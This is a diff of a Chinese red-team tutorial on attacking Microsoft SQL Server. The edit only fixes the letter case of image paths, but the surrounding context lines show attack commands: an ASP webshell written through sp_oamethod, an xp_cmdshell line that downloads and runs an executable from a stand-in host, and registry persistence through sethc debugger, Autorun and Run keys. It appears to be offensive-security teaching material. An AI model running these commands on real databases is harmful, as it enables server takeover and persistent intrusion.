@@ -97,11 +97,11 @@ exec xp_dirtree 'c:',1,1
 exec xp_dirtree 'c:'
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/18.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/18.png)
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/19.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/19.png)
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/20.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/20.png)
 
 xp_dirtree 还可以用来触发 NTLM 请求
 ```sql
@@ -118,7 +118,7 @@ xp_subdirs 用于得到给定的文件夹内的文件夹列表
 exec xp_subdirs "C:\\"
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/21.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/21.png)
 
 **xp_fixeddrives**
 
@@ -129,7 +129,7 @@ xp_fixeddrives 用于查看磁盘驱动器剩余（free）的空间
 EXEC xp_fixeddrives
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/22.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/22.png)
 
 **xp_availablemedia**
 
@@ -140,7 +140,7 @@ xp_availablemedia 用于获得当前所有驱动器
 EXEC xp_availablemedia
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/23.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/23.png)
 
 **xp_fileexist**
 
@@ -185,7 +185,7 @@ xp_regenumkeys 可以查看指定的注册表
 exec xp_regenumkeys 'HKEY_CURRENT_USER','Control Panel\International'
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/24.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/24.png)
 
 **xp_regdeletekey**
 
@@ -213,9 +213,9 @@ exec sp_oamethod @o, 'createtextfile', @f out, 'C:\www\test.asp', 1
 exec @ret = sp_oamethod @f, 'writeline', NULL,'<%execute(request("a"))%>'
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/25.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/25.png)
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/26.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/26.png)
 
 ## 差异备份写webshell
 
@@ -328,7 +328,7 @@ exec master..xp_cmdshell 'cmd /c whoami'
 exec master..xp_cmdshell '"echo $client = New-Object System.Net.WebClient > %TEMP%\test.ps1 & echo $client.DownloadFile("http://example/test0.exe","%TEMP%\test.exe") >> %TEMP%\test.ps1 & powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 & WMIC process call create "%TEMP%\test.exe""'
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/27.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/27.png)
 
 **无会显,也无法进行 dnslog 怎么办**
 
@@ -339,7 +339,7 @@ insert into tmpTable(tmp1) exec master..xp_cmdshell 'ipconfig'
 select * from tmpTable
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/28.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/28.png)
 
 **常见报错**
 
@@ -419,7 +419,7 @@ exec sp_oacreate 'wscript.shell',@ffffffff0x output
 exec sp_oamethod @ffffffff0x,'run',null,'c:\windows\system32\cmd.exe /c whoami >c:\\www\\1.txt'
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/12.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/12.png)
 
 **利用 com 组件执行命令**
 ```sql
@@ -431,7 +431,7 @@ exec sp_oamethod @text, 'readall', @str out
 select @str;
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/14.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/14.png)
 
 **利用 com 组件写文件**
 ```sql
@@ -445,7 +445,7 @@ EXEC sp_oamethod @ObjectToken, 'Close';
 EXEC sp_OADestroy @ObjectToken;
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/13.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/13.png)
 
 **filesystemobject COM 对象利用**
 
@@ -464,9 +464,9 @@ DECLARE @s int EXEC sp_oacreate [wscript.shell], @s out
 EXEC sp_oamethod @s,[run],NULL,[c:\\www\\ffffffff0x.vbs]
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/15.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/15.png)
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/16.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/16.png)
 
 ```sql
 -- 复制具有不同名称和位置的 calc.exe 可执行文件
@@ -475,7 +475,7 @@ exec sp_oacreate 'scripting.filesystemobject', @ffffffff0x out;
 exec sp_oamethod @ffffffff0x,'copyfile',null,'c:\\windows\\system32\calc.exe','c:\\windows\\system32\calc_copy.exe';
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/8.webp)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/8.webp)
 
 ```sql
 -- 移动文件
@@ -570,7 +570,7 @@ exec master..xp_regwrite @rootkey='HKEY_LOCAL_MACHINE',@key='SOFTWARE\Microsoft\
 exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/17.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/17.png)
 
 **将 COM 对象注册到 CLSID**
 
@@ -602,9 +602,9 @@ N'1.0';
 EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Command Processor','Autorun','REG_SZ','c:\windows\system32\calc.exe'
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/2.webp)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/2.webp)
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/3.webp)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/3.webp)
 
 **Run & RunOnce**
 
@@ -614,11 +614,11 @@ Run 和 RunOnce 注册表项会导致程序在用户每次登录时运行。
 EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run','Aut3','REG_SZ','c:\windows\system32\calc.exe'
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/9.webp)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/9.webp)
 
 注销，重新登录,触发 calc
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/10.webp)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/10.webp)
 
 **禁用指定软件**
 
@@ -629,7 +629,7 @@ EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\Cur
 EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Everything.exe','Debugger','REG_SZ','taskkill.exe'
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/11.webp)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/11.webp)
 
 此时只要开启 Everything 就会自动关闭.
 
@@ -706,7 +706,7 @@ go
 exec dbo.ExecCommand "whoami /all";
 ```
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/7.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/7.png)
 
 格式简化
 ```sql
@@ -755,15 +755,15 @@ UPDATE user SET id = '22' WHERE nickname = 'f0x'
 
 实际测试，可以看到执行命令卡住了,一直没有结束
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/4.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/4.png)
 
 查看任务管理器，calc 运行了
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/5.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/5.png)
 
 手动将 calc 结束,此时语句执行完毕返回结果，执行时间等于 calc 运行的时间
 
-![](../../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/MSSQL/6.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/MSSQL/6.png)
 
 ## SQL Server R 和 Python 的利用
 
